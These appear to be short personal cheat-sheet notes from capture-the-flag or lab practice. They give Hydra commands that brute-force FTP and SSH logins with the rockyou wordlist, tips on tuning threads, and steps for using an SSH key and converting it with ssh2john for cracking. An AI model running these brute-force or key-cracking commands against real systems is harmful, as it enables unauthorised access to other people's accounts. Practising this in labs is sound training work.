# Brute-force, Keys, and Hydra (cleaned notes)

## Hydra (examples)
# FTP (explicit port)
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.213.112:10021

# SSH (lab)
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.104.79 ssh

# Tuned & verbose
hydra -t 8 -vV -L usernames.txt -P /path/to/rockyou.txt ssh://10.10.132.130

Notes:
- Reduce threads if the service resets connections (`-t 4` recommended).
- Confirm the exact protocol/URL (ftp:// vs ssh) before running.
- Mark as LAB ONLY.

## SSH keys & permissions
# Set correct permissions locally
chmod 600 id_rsa

# Use the key
ssh -i id_rsa user@10.10.166.125

# Convert private key for John
python3 /opt/john/ssh2john.py id_rsa > id_rsa_hash.txt
